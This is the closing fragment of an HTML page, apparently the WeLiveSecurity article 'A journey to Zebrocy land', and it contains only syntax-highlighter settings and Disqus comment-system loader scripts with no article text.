			var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":"", "numsVisible": false};
			var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
		</script>
		<script src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/static/js/crayon.min.js"></script>

			
		
    <script>
    	Main.init();
    </script>

    <script type='text/javascript'>
/* <![CDATA[ */
var countVars = {"disqusShortname":"welivesecurity"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_count.js?ver=3.0.16'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var embedVars = {"disqusConfig":{"integration":"wordpress 3.0.16"},"disqusIdentifier":"125794 https:\/\/ba-infohub-web01-v.hq.eset.com\/?p=125794","disqusShortname":"welivesecurity","disqusTitle":"A journey to Zebrocy land","disqusUrl":"https:\/\/www.welivesecurity.com\/2019\/05\/22\/journey-zebrocy-land\/","postId":"125794"};
/* ]]> */
</script>
<script type='text/javascript' src='https://www.welivesecurity.com/wp-content/plugins/disqus-comment-system/public/js/comment_embed.js?ver=3.0.16'></script>
    <script src="https://assets.esetstatic.com/3PR/app.min.js"></script>
  </body>
</html>